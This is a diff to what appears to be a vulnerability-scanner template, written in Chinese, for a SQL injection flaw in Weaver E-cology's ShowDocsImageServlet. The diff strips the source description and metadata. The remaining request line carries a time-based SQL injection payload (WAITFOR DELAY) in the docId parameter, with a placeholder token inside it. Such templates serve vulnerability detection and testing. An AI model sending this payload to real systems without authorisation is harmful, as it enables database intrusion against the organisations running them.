@@ -3,12 +3,8 @@ info:
   name: 泛微 E-cology weaver.docs.docs.ShowDocsImageServlet 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hzqyhiga4rhx58ek'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: hzqyhiga4rhx58ek
-    fofa: 暂无
 http:
 - raw:
   - 'GET /weaver/weaver.docs.docs.ShowDocsImageServlet?docId=1+WAITFOR+DELAY+''0%3a0%3a5''<AttackCode>$ HTTP/1.1
